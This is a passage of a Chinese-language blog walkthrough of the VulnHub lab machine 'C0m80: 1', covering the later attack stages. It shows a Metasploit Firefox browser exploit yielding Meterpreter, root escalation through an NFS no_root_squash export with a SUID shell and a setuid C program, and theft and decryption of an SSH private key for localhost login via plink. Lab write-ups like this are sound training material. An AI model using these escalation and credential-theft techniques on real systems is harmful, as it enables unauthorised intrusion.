+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/b0b/.wine/drive_c/Program Files/Mozilla Firefox/install.log</span><br></pre></td></tr></table></figure>
+
+<p>使用模块 <code>exploit/multi/browser/firefox_proto_crmfrequest</code> 或 <code>browser_autopwn2</code></p>
+<p>通过 <code>Report-Link</code> 命令向 FTP 服务器发送恶意 URL（指向 Metasploit 监听的恶意页面）</p>
+<p>目标 Firefox 访问后触发漏洞，返回 Meterpreter Shell</p>
+<h3 id="NFS-配置不当"><a href="#NFS-配置不当" class="headerlink" title="NFS 配置不当"></a>NFS 配置不当</h3><p>这一步在横向之后</p>
+<p>NFS 服务器配置了 no_root_squash，这意味着客户端<code>root</code>用户与服务器<code>root</code>用户拥有相同的权限，也就是说客户端 uid 0 与服务器 uid 0 相同</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /etc/exports</span><br><span class="line">/ftpsvr/bkp           *(rw,<span class="built_in">sync</span>,no_root_squash,no_subtree_check)</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>al1ce</code> Shell 中复制 <code>/bin/sh</code> 到 <code>/ftpsvr/bkp/sh</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 192.168.110.142:/ftpsvr/bkp ./ftpsvr</span><br></pre></td></tr></table></figure>
+
+<p>更改挂载目录中 <code>sh</code> 的所有者为 <code>root:root</code> 并添加 SUID 位</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chown</span> root:root ftpsvr/bkp/sh</span><br><span class="line"><span class="built_in">chmod</span> a+s ftpsvr/bkp/sh</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>al1ce</code> Shell 中执行 <code>./sh</code>，获得有效用户 ID (euid) 为 root 的 Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">al1ce@c0m80:/ftpsvr/bkp$ ./sh</span><br><span class="line"></span><br><span class="line">root@c0m80# <span class="built_in">id</span></span><br><span class="line">uid=1001(al1ce) gid=34(backup) euid=0(root) egid=0(root) <span class="built_in">groups</span>=0(root),34(backup)</span><br><span class="line">root#c0m80# </span><br></pre></td></tr></table></figure>
+
+<p>由于实际 uid 仍是 <code>al1ce</code>，某些操作受限，需编译一个自定义程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">main() &#123; setuid(<span class="number">0</span>); system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译为 <code>getroot</code>，同样通过 NFS 赋予 SUID 并执行，获得完整 root 权限</p>
+<h2 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h2><h3 id="PuTTY-代替-SSH"><a href="#PuTTY-代替-SSH" class="headerlink" title="PuTTY 代替 SSH"></a>PuTTY 代替 SSH</h3><p>查看 <code>/home/b0b/.ssh</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">ls</span></span><br><span class="line">Listing: Z:\\home\\b0b\\.ssh</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  181   fil   2017-09-22 23:32:09 -0400  .save~</span><br><span class="line">100666/rw-rw-rw-  1766  fil   2017-09-22 16:05:59 -0400  id_rsa</span><br><span class="line">100666/rw-rw-rw-  391   fil   2017-09-22 16:05:59 -0400  id_rsa.pub</span><br><span class="line">100666/rw-rw-rw-  222   fil   2017-09-22 21:58:31 -0400  known_hosts</span><br><span class="line"></span><br><span class="line">meterpreter &gt; download id_rsa</span><br><span class="line"></span><br><span class="line">meterpreter &gt; download id_rsa.pub</span><br></pre></td></tr></table></figure>
+
+<p>但是前期并没有扫描出 SSH 服务，通过查看靶机的 SSH 服务配置文件 <code>/etc/ssh/sshd_config</code>，我们发现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Port 65122</span><br><span class="line">ListenAddress ::1</span><br></pre></td></tr></table></figure>
+
+<p>这意味着 SSH 服务<strong>只接受来自本机的连接</strong>，不监听任何外部网络接口</p>
+<p>同时尝试直接使用 <code>id_rsa</code> 文件时，发现该私钥是加密的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>:</span><br></pre></td></tr></table></figure>
+
+<p>查看 <code>.save~</code> 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b0b@c0m80 $ <span class="built_in">cat</span> .save~</span><br><span class="line"><span class="comment">###### NO PASWORD HERE SRY ######</span></span><br><span class="line"></span><br><span class="line">I\&#x27;m using my new password manager</span><br><span class="line"></span><br><span class="line">           PWMangr2</span><br><span class="line"></span><br><span class="line">      just a note to say</span><br><span class="line"></span><br><span class="line">   WELL DONE &amp; KEEP IT UP ;D</span><br><span class="line"></span><br><span class="line"><span class="comment">#################################</span></span><br></pre></td></tr></table></figure>
+
+<p>查找这个文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@C0m80:/$ find / -name <span class="string">&#x27;*PWMangr2*&#x27;</span> 2&gt;/dev/null</span><br><span class="line">/home/b0b/.wine/drive_c/users/b0b/Application Data/Mozilla/Extensions/PWMangr2.html</span><br></pre></td></tr></table></figure>
+
+<p>使用 meterpreter 将文件下载到计算机，然后用浏览器打开它</p>
+<p><img src="https://pic1.imgdb.cn/item/69d0c71675fc555b73372ccf.png"></p>
+<p>数据在源代码中，但已加密</p>
+<p>提示是“超级好友”，谁会是鲍勃最好的朋友？游戏中只有三名玩家：爱丽丝、杰夫和鲍勃本人</p>
+<p>根据提示 <code>superbuddies</code> 猜测密码为 <code>alice</code>，成功解密得到 SSH 私钥的密码：<code>7M6Kt8tC8X5Qz99@Eeb8592Z$Fd@u286</code></p>
+<p>列出系统上已安装的软件包会发现 PuTTY，并且支持 SSH 连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ apt list --installed</span><br><span class="line">...</span><br><span class="line">putty-tools/trusty-updates,trusty-security,now 0.63-4ubuntu0.1 i386 [installed]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>靶机已安装 <code>putty-tools</code>，包含 <code>plink</code>（SSH 客户端）和 <code>puttygen</code></p>
+<p>将 OpenSSH 私钥转换为 PuTTY 格式（<code>.ppk</code>）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puttygen id_rsa -O private -o id_rsa.ppk</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>plink</code> 连接本地 SSH</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink -ssh -6 -v -P 65122 al1ce@localhost -i id_rsa.ppk</span><br></pre></td></tr></table></figure>
+
+<p>输入密码后成功获得 <code>al1ce</code> Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@C0m80:/tmp$ puttygen id_rsa -O private -o id_rsa.ppk</span><br><span class="line">Enter passphrase to load key: 7M6Kt8tC8X5Qz99@Eeb8592Z<span class="variable">$Fd</span>@u286</span><br><span class="line"></span><br><span class="line">www-data@C0m80:/tmp$ plink -ssh -6 -v -P 65122 al1ce@localhost -i id_rsa.ppk</span><br><span class="line">           </span><br><span class="line">Looking up host <span class="string">&quot;localhost&quot;</span> (IPv6)</span><br><span class="line">Connecting to ::1 port 65122</span><br><span class="line">Server version: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8</span><br><span class="line">Using SSH protocol version 2</span><br><span class="line">...</span><br><span class="line">Passphrase <span class="keyword">for</span> key <span class="string">&quot;imported-openssh-key&quot;</span>: 7M6Kt8tC8X5Qz99@Eeb8592Z<span class="variable">$Fd</span>@u286</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Last login: Wed Dec 30 11:46:54 2020 from localhost</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1001(al1ce) gid=34(backup) <span class="built_in">groups</span>=34(backup)</span><br></pre></td></tr></table></figure>
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/VulnHub/" title="VulnHub" data-aos="zoom-in">VulnHub</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/FireFox%EF%BC%88CVE-2012-3993-CVE-2013-1710%EF%BC%89/" rel="tag" title="FireFox（CVE-2012-3993&amp;CVE-2013-1710）">FireFox（CVE-2012-3993&amp;CVE-2013-1710）</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/NFS-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93/" rel="tag" title="NFS 配置不当">NFS 配置不当</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/PuTTY-%E4%BB%A3%E6%9B%BF-SSH/" rel="tag" title="PuTTY 代替 SSH">PuTTY 代替 SSH</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag" title="RCE">RCE</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/" rel="tag" title="任意密码重置">任意密码重置</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E9%80%86%E5%90%91/" rel="tag" title="逆向">逆向</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    <div class="article-nav-link-wrap right">
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="2024 第一届 Solar 应急响应挑战赛" class="lazyload">
+      <a href="/2026/04/02/2024%20%E7%AC%AC%E4%B8%80%E5%B1%8A%20Solar%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B/" aria-label="后一篇: 2024 第一届 Solar 应急响应挑战赛"  title="后一篇: 2024 第一届 Solar 应急响应挑战赛"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          2024 第一届 Solar 应急响应挑战赛
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      ALL
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        50.2k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        04:17
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#C0m80-1"><span class="toc-number">1.</span> <span class="toc-text">C0m80: 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">任意密码重置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MantisBT%EF%BC%88CVE-2017-7615%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">MantisBT（CVE-2017-7615）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.2.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MantisBT%EF%BC%88CVE-2019-15715%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">MantisBT（CVE-2019-15715）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91"><span class="toc-number">1.3.</span> <span class="toc-text">逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bestFTPserver"><span class="toc-number">1.3.1.</span> <span class="toc-text">bestFTPserver</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FireFox%EF%BC%88CVE-2012-3993-CVE-2013-1710%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">FireFox（CVE-2012-3993&amp;CVE-2013-1710）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NFS-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">1.4.2.</span> <span class="toc-text">NFS 配置不当</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91"><span class="toc-number">1.5.</span> <span class="toc-text">横向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PuTTY-%E4%BB%A3%E6%9B%BF-SSH"><span class="toc-number">1.5.1.</span> <span class="toc-text">PuTTY 代替 SSH</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">42</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">83</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "ALL",
+          title: "VulnHub C0m80：1",
+          url: "http://example.com/2026/04/04/C0m80%201/",
+          excerpt: "",
+          description: "",
+          stripContent: "C0m80: 1项目地址：https://download.vulnhub.com/c0m80/C0m80_3mrgnc3_v1.0.ova 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  扫描目录发现有使用 MantisBT 这个系统  任意密码重置MantisBT（CVE-2017-7615）搜索 NDay 发现存在一个任意密码重置漏洞 1http://192.168.110.142/bugs/verify.php?",
+          date: "Sat Apr 04 2026 16:32:00 GMT+0800",
+          updated: "Sat Apr 04 2026 16:44:46 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
